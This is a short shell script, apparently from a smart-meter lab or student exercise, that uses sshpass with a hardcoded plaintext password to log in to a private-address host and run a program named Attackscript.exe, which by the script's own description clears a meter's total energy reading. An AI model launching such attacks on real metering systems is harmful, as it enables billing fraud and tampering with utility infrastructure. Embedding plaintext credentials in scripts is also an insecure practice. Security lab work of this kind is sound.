#!/bin/sh

# Description: This file/script demostrates the clearing of total energy reading within the Smart Meter System 
# Tag: Clear reading  
sshpass -p 'Student12345@' ssh -o ConnectTimeout=5 student@172.16.2.223 "cd \"C:\Windows\Temp\SmartMetertest\" && Attackscript.exe 10"
